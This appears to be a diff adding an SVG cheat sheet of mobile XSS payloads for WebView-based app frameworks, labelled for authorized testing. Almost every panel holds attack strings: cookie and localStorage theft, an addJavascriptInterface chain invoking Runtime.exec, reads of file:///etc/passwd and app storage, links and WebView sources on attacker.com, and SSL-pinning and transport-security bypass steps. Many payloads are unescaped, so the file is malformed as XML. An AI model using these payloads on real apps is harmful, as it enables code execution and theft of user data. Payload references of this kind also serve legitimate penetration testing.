@@ -1,0 +1,336 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Mobile-Specific SVG XSS Vectors
+  Android WebView, iOS WKWebView, React Native, Flutter, Cordova/Capacitor
+  For authorized security testing only
+-->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 800 1000">
+  <title>Mobile-Specific SVG XSS Vectors</title>
+
+  <defs>
+    <style><![CDATA[
+      .platform { fill: #1971c2; }
+      .vector { fill: #fab005; }
+      .text { font-family: monospace; font-size: 9px; fill: #f8f9fa; }
+      .title { font-size: 12px; fill: #fff; font-weight: bold; }
+      .warning { fill: #fa5252; font-weight: bold; }
+    ]]></style>
+  </defs>
+
+  <!-- =====================================================================
+       ANDROID WEBVIEW
+       ===================================================================== -->
+  <g transform="translate(10, 10)">
+    <rect class="platform" width="380" height="220" rx="5"/>
+    <text class="title" x="10" y="25">🤖 ANDROID WEBVIEW</text>
+
+    <text class="text" x="10" y="45">Basic XSS (JS enabled):</text>
+    <text class="text" x="10" y="60" font-size="8"><svg onload=alert(document.domain)></svg></text>
+
+    <text class="text" x="10" y="80">addJavascriptInterface RCE:</text>
+    <text class="text" x="10" y="95" font-size="8"><svg onload="window.jsInterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec(['id'])" /></text>
+
+    <text class="text" x="10" y="115">File Access (setAllowFileAccess):</text>
+    <text class="text" x="10" y="130" font-size="8"><svg onload="fetch('file:///etc/passwd').then(r=>r.text()).then(t=>alert(t))" /></text>
+
+    <text class="text" x="10" y="150">Universal XSS (CVE-2020-6547):</text>
+    <text class="text" x="10" y="165" font-size="8"><svg onload="history.pushState({},'', 'javascript:alert(1)'); history.go(0)" /></text>
+
+    <text class="text" x="10" y="185">Intent Scheme Injection:</text>
+    <text class="text" x="10" y="200" font-size="8"><a xlink:href="intent://attacker.com#Intent;scheme=https;package=com.target.app;end"><svg onload=alert(1)></a></text>
+
+    <text class="text" x="10" y="220">Cookie Access:</text>
+    <text class="text" x="10" y="235" font-size="8"><svg onload="alert('Cookies: ' + document.cookie)" /></text>
+
+    <!-- Test vector -->
+    <foreignObject x="200" y="40" width="170" height="170">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('Android WebView XSS Vectors:');
+          console.log('1. Basic: <svg onload=alert(domain)>');
+          console.log('2. JSI: window.interface.method()');
+          console.log('3. File: file:///etc/passwd');
+          console.log('4. UXSS: history.pushState');
+          console.log('5. Intent: intent:// scheme');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       iOS WKWEBVIEW
+       ===================================================================== -->
+  <g transform="translate(410, 10)">
+    <rect class="platform" width="380" height="220" rx="5"/>
+    <text class="title" x="10" y="25">🍎 iOS WKWEBVIEW</text>
+
+    <text class="text" x="10" y="45">Basic XSS:</text>
+    <text class="text" x="10" y="60" font-size="8"><svg onload=alert(document.domain)></svg></text>
+
+    <text class="text" x="10" y="80">WKScriptMessageHandler:</text>
+    <text class="text" x="10" y="95" font-size="8"><svg onload="window.webkit.messageHandlers.handler.postMessage('xss')" /></text>
+
+    <text class="text" x="10" y="115">Universal Links / Deep Links:</text>
+    <text class="text" x="10" y="130" font-size="8"><a xlink:href="https://target.app/xss?payload=<svg onload=alert(1)>">Click</a></text>
+
+    <text class="text" x="10" y="150">Custom URL Schemes:</text>
+    <text class="text" x="10" y="165" font-size="8"><a xlink:href="targetapp://xss?data=<svg onload=alert(1)>">Open App</a></text>
+
+    <text class="text" x="10" y="185">Cookie/Storage Access:</text>
+    <text class="text" x="10" y="200" font-size="8"><svg onload="alert('localStorage: ' + JSON.stringify(localStorage))" /></text>
+
+    <text class="text" x="10" y="220">Screenshot/Privacy:</text>
+    <text class="text" x="10" y="235" font-size="8"><svg onload="navigator.mediaDevices.getUserMedia({video:true})" /></text>
+
+    <foreignObject x="200" y="40" width="170" height="170">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('iOS WKWebView XSS Vectors:');
+          console.log('1. Basic SVG onload');
+          console.log('2. webkit.messageHandlers');
+          console.log('3. Universal Links');
+          console.log('4. Custom URL Schemes');
+          console.log('5. localStorage/cookies');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       REACT NATIVE
+       ===================================================================== -->
+  <g transform="translate(10, 250)">
+    <rect class="platform" width="380" height="220" rx="5"/>
+    <text class="title" x="10" y="25">⚛️ REACT NATIVE (WebView)</text>
+
+    <text class="text" x="10" y="45">react-native-webview:</text>
+    <text class="text" x="10" y="60" font-size="8"><WebView source={{html: '<svg onload=alert(1)>'}} /></text>
+
+    <text class="text" x="10" y="80">injectedJavaScript:</text>
+    <text class="text" x="10" y="95" font-size="8">injectedJavaScript="document.body.innerHTML+='<svg onload=alert(1)>'"</text>
+
+    <text class="text" x="10" y="115">onMessage / postMessage:</text>
+    <text class="text" x="10" y="130" font-size="8"><svg onload="window.ReactNativeWebView.postMessage('xss')" /></text>
+
+    <text class="text" x="10" y="150">Java/Kotlin Bridge (Android):</text>
+    <text class="text" x="10" y="165" font-size="8"><svg onload="window.RNWebViewBridge.method('exploit')" /></text>
+
+    <text class="text" x="10" y="185">Swift/ObjC Bridge (iOS):</text>
+    <text class="text" x="10" y="200" font-size="8"><svg onload="window.webkit.messageHandlers.RNWebView.postMessage('xss')" /></text>
+
+    <text class="text" x="10" y="220">File Scheme Access:</text>
+    <text class="text" x="10" y="235" font-size="8"><svg onload="fetch('file:///data/data/com.app/files/').then(r=>r.text()).then(alert)" /></text>
+
+    <foreignObject x="200" y="40" width="170" height="170">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('React Native WebView XSS:');
+          console.log('1. source={{html: payload}}');
+          console.log('2. injectedJavaScript prop');
+          console.log('3. postMessage bridge');
+          console.log('4. Native module bridge');
+          console.log('5. File scheme access');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       FLUTTER
+       ===================================================================== -->
+  <g transform="translate(410, 250)">
+    <rect class="platform" width="380" height="220" rx="5"/>
+    <text class="title" x="10" y="25">💙 FLUTTER (webview_flutter)</text>
+
+    <text class="text" x="10" y="45">WebViewWidget / WebView:</text>
+    <text class="text" x="10" y="60" font-size="8">WebView(initialUrl: 'data:image/svg+xml,<svg onload=alert(1)>')</text>
+
+    <text class="text" x="10" y="80">JavaScript Channels:</text>
+    <text class="text" x="10" y="95" font-size="8"><svg onload="window.flutterChannel.postMessage('xss')" /></text>
+
+    <text class="text" x="10" y="115">runJavaScript / runJavaScriptReturningResult:</text>
+    <text class="text" x="10" y="130" font-size="8">controller.runJavaScript('document.body.innerHTML+=`<svg onload=alert(1)>`')</text>
+
+    <text class="text" x="10" y="150">NavigationDelegate:</text>
+    <text class="text" x="10" y="165" font-size="8">onPageStarted: inject SVG XSS after load</text>
+
+    <text class="text" x="10" y="185">Platform Views (Android/iOS):</text>
+    <text class="text" x="10" y="200" font-size="8">Android: PlatformViewLink + WebView | iOS: WKWebView via platform view</text>
+
+    <text class="text" x="10" y="220">Cookie Manager:</text>
+    <text class="text" x="10" y="235" font-size="8"><svg onload="alert('Cookies: ' + document.cookie)" /></text>
+
+    <foreignObject x="200" y="40" width="170" height="170">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('Flutter webview_flutter XSS:');
+          console.log('1. initialUrl with data: URI');
+          console.log('2. JavaScript channels');
+          console.log('3. runJavaScript injection');
+          console.log('4. NavigationDelegate hook');
+          console.log('5. CookieManager access');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       CORDOVA / CAPACITOR / IONIC
+       ===================================================================== -->
+  <g transform="translate(10, 490)">
+    <rect class="platform" width="380" height="220" rx="5"/>
+    <text class="title" x="10" y="25">⚡ CORDOVA / CAPACITOR / IONIC</text>
+
+    <text class="text" x="10" y="45">Cordova WebView (Android):</text>
+    <text class="text" x="10" y="60" font-size="8">SystemWebView / Crosswalk / WebViewEngine</text>
+
+    <text class="text" x="10" y="80">Cordova Plugins Bridge:</text>
+    <text class="text" x="10" y="95" font-size="8"><svg onload="cordova.plugins.SomePlugin.exploit()" /></text>
+    <text class="text" x="10" y="110" font-size="8"><svg onload="window.plugins.fileOpener.open(...)" /></text>
+
+    <text class="text" x="10" y="130">Capacitor Plugins:</text>
+    <text class="text" x="10" y="145" font-size="8"><svg onload="window.Capacitor.Plugins.PluginName.method()" /></text>
+    <text class="text" x="10" y="160" font-size="8"><svg onload="window.Capacitor.convertFileSrc('file:///etc/passwd')" /></text>
+
+    <text class="text" x="10" y="180">Ionic Framework:</text>
+    <text class="text" x="10" y="195" font-size="8"><ion-content [innerHTML]="'<svg onload=alert(1)>'"></ion-content></text>
+
+    <text class="text" x="10" y="215">File/Storage Access:</text>
+    <text class="text" x="10" y="230" font-size="8"><svg onload="fetch('cdvfile://localhost/persistent/').then(r=>r.text()).then(alert)" /></text>
+
+    <foreignObject x="200" y="40" width="170" height="170">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('Cordova/Capacitor/Ionic XSS:');
+          console.log('1. cordova.plugins bridge');
+          console.log('2. Capacitor.Plugins bridge');
+          console.log('3. Ionic innerHTML binding');
+          console.log('4. cdvfile:// protocol');
+          console.log('5. File plugin access');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       EXPO / REACT NATIVE WEB
+       ===================================================================== -->
+  <g transform="translate(410, 490)">
+    <rect class="platform" width="380" height="220" rx="5"/>
+    <text class="title" x="10" y="25">📱 EXPO / REACT NATIVE WEB</text>
+
+    <text class="text" x="10" y="45">Expo WebView:</text>
+    <text class="text" x="10" y="60" font-size="8"><WebView source={{uri: 'https://attacker.com/xss.svg'}} /></text>
+
+    <text class="text" x="10" y="80">Expo Router Deep Links:</text>
+    <text class="text" x="10" y="95" font-size="8">exp://127.0.0.1:8081/--/xss?payload=<svg onload=alert(1)></text>
+
+    <text class="text" x="10" y="115">React Native Web (DOM):</text>
+    <text class="text" x="10" y="130" font-size="8">div dangerouslySetInnerHTML={{__html: '<svg onload=alert(1)>'}} /></text>
+
+    <text class="text" x="10" y="150">Expo Updates (OTA):</text>
+    <text class="text" x="10" y="165" font-size="8">Malicious SVG in OTA bundle loaded via WebView</text>
+
+    <text class="text" x="10" y="185">SecureStore / AsyncStorage:</text>
+    <text class="text" x="10" y="200" font-size="8"><svg onload="fetch('exp://127.0.0.1:8081/--/storage').then(r=>r.json()).then(alert)" /></text>
+
+    <text class="text" x="10" y="220">Dev Tools / Metro:</text>
+    <text class="text" x="10" y="235" font-size="8"><svg onload="console.log('Metro bundler accessible')" /></text>
+
+    <foreignObject x="200" y="40" width="170" height="170">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('Expo/React Native Web XSS:');
+          console.log('1. WebView remote URI');
+          console.log('2. Expo Router deep links');
+          console.log('3. RN Web dangerouslySetInnerHTML');
+          console.log('4. OTA update injection');
+          console.log('5. AsyncStorage access');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       PWA / TWA / BUBBLEWRAP
+       ===================================================================== -->
+  <g transform="translate(10, 730)">
+    <rect class="platform" width="380" height="220" rx="5"/>
+    <text class="title" x="10" y="25">🌐 PWA / TWA / BUBBLEWRAP</text>
+
+    <text class="text" x="10" y="45">Trusted Web Activity (TWA):</text>
+    <text class="text" x="10" y="60" font-size="8">Digital Asset Links + SVG XSS in scope</text>
+
+    <text class="text" x="10" y="80">Bubblewrap / PWABuilder:</text>
+    <text class="text" x="10" y="95" font-size="8">Manifest scope includes SVG upload endpoint</text>
+
+    <text class="text" x="10" y="115">Service Worker:</text>
+    <text class="text" x="10" y="130" font-size="8"><svg onload="navigator.serviceWorker.register('sw.js').then(r=>r.update())" /></text>
+
+    <text class="text" x="10" y="150">Cache API / IndexedDB:</text>
+    <text class="text" x="10" y="165" font-size="8"><svg onload="caches.open('xss').then(c=>c.put('/','<svg onload=alert(1)>'))" /></text>
+
+    <text class="text" x="10" y="185">Web Share / Web NFC:</text>
+    <text class="text" x="10" y="200" font-size="8"><svg onload="navigator.share({files: [new File(['<svg onload=alert(1)>'], 'x.svg')])" /></text>
+
+    <text class="text" x="10" y="220">Background Sync:</text>
+    <text class="text" x="10" y="235" font-size="8"><svg onload="navigator.serviceWorker.ready.then(r=>r.sync.register('xss-sync'))" /></text>
+
+    <foreignObject x="200" y="40" width="170" height="170">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('PWA/TWA/Bubblewrap XSS:');
+          console.log('1. TWA scope validation');
+          console.log('2. Manifest scope bypass');
+          console.log('3. Service Worker injection');
+          console.log('4. Cache/IndexedDB poisoning');
+          console.log('5. Web Share/NFC abuse');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       MOBILE SPECIFIC BYPASSES
+       ===================================================================== -->
+  <g transform="translate(410, 730)">
+    <rect class="platform" width="380" height="220" rx="5"/>
+    <text class="title" x="10" y="25">🔓 MOBILE-SPECIFIC BYPASSES</text>
+
+    <text class="text" x="10" y="45">SSL Pinning Bypass (Frida/Objection):</text>
+    <text class="text" x="10" y="60" font-size="8">objection -g com.app explore → sslpinning disable</text>
+
+    <text class="text" x="10" y="80">Root/Jailbreak Detection Bypass:</text>
+    <text class="text" x="10" y="95" font-size="8"><svg onload="console.log('Root: ' + (window.navigator.userAgent.includes('Linux') ? 'Android' : 'iOS'))" /></text>
+
+    <text class="text" x="10" y="115">Certificate Transparency Bypass:</text>
+    <text class="text" x="10" y="130" font-size="8">Custom CA + user-installed cert + SVG XSS payload</text>
+
+    <text class="text" x="10" y="150">App Transport Security (iOS) Bypass:</text>
+    <text class="text" x="10" y="165" font-size="8">NSAppTransportSecurity → NSAllowsArbitraryLoads in Info.plist</text>
+
+    <text class="text" x="10" y="185">Network Security Config (Android) Bypass:</text>
+    <text class="text" x="10" y="200" font-size="8">network_security_config.xml → cleartextTrafficPermitted=true</text>
+
+    <text class="text" x="10" y="220">Biometric/Keychain Bypass:</text>
+    <text class="text" x="10" y="235" font-size="8"><svg onload="console.log('Keychain: ' + (window.Keychain ? 'accessible' : 'protected'))" /></text>
+
+    <foreignObject x="200" y="40" width="170" height="170">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('Mobile Bypass Techniques:');
+          console.log('1. SSL Pinning: Frida/Objection');
+          console.log('2. Root Detection: Frida hooks');
+          console.log('3. CT: Custom CA');
+          console.log('4. ATS: Info.plist config');
+          console.log('5. NSC: network_security_config');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- Footer -->
+  <text class="text" x="10" y="955" font-size="10">
+    Mobile-Specific SVG XSS Vectors | Test on physical devices/emulators | Authorized Testing Only
+  </text>
+</svg>
